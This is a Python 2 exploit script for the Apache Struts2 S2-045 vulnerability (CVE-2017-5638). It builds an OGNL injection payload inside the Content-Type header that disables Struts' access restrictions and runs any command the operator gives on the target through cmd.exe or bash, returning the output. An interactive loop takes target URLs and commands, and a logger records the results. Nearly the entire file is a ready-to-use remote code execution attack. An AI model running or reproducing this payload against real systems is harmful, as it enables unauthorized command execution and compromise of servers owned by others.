#!/usr/bin/python
# -*- coding: utf-8 -*-
import urllib2
import loggerExp
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
def poc(w_url,cmd):
    register_openers()
    datagen, header = multipart_encode({"image1": '23333'})
    header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    s1 = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd="
    s2 = ").(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    header["Content-Type"] = s1 + "'" + cmd + "'" + s2
    request = urllib2.Request(w_url, datagen, headers=header)
    response = urllib2.urlopen(request,timeout=3)
    page = response.read()
    response.close()
    print(page[0:500])
    loggerExp.log.debug('url:'+w_url+'--cmd:'+cmd+'\n'+'--result:'+page)
if __name__ == '__main__':
    while 1:
        try:
            if len(sys.argv) != 3:
                print("[*] struts2_S2-045.py <url> <cmd>")
                url = raw_input('url:')
                if (url == 'q'):
                    sys.exit()
                print("[*] url: %s\n" % url)
                while 1:
                    cmd = raw_input('cmd:')
                    print("[*] cmd: %s\n" % cmd)
                    if(cmd == 'q'):
                        break 
                    poc(url, cmd)
            else:
                 print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')
                 url = sys.argv[1]
                 cmd = sys.argv[2]
                 print("[*] url: %s\n" % url)
                 print("[*] cmd: %s\n" % cmd)
                 poc(url, cmd)
        except Exception as e:
        	 print str(e)



